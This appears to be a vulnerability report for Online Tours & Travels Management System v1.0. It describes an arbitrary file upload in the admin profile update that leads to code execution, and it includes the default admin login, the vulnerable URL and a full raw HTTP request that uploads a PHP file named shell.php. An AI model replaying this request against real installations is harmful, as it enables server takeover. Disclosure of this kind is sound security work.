# Online Tours & Travels Management System v1.0 by mayuri_k has arbitrary code execution (RCE)

BUG_Author: Dig-Bick

vendors: https://www.sourcecodester.com/php/14510/online-tours-travels-management-system-project-using-php-and-mysql.html

The program is built using the xmapp-php8.1 version

Login account: mayuri.infospace@gmail.com/admin (Super Admin account)

Vulnerability url: ip/tour/admin/operations/admin.php?id=2

Loophole location: Online Tours & Travels management system's update_profile.php file exists arbitrary file upload (RCE)

Request package for file upload：

```sql
POST /tour/admin/operations/admin.php?id=2 HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://192.168.1.19/tour/admin/update_profile.php
Cookie: PHPSESSID=g29omi7f91g3h7ud1uhq6rbmkv
Connection: close
Content-Type: multipart/form-data; boundary=---------------------------27994107238879
Content-Length: 856

-----------------------------27994107238879
Content-Disposition: form-data; name="fname"

Mayuri
-----------------------------27994107238879
Content-Disposition: form-data; name="lname"

K
-----------------------------27994107238879
Content-Disposition: form-data; name="email"

mayuri.infospace@gmail.com
-----------------------------27994107238879
Content-Disposition: form-data; name="contact"

+919405716239
-----------------------------27994107238879
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/octet-stream

JFJF
<?php phpinfo();?>
-----------------------------27994107238879
Content-Disposition: form-data; name="old_img"

133.jpeg
-----------------------------27994107238879
Content-Disposition: form-data; name="update"


-----------------------------27994107238879--
```

The files will be uploaded to this directory \tour\admin\upload

![image](https://user-images.githubusercontent.com/54017627/183005962-c304702a-96f0-48bc-b123-823bcea4f549.png)

We visited the directory of the file in the browser and found that the code had been executed

![image](https://user-images.githubusercontent.com/54017627/183006028-cd7df3bf-28e0-432d-a1ca-73d98e747605.png)
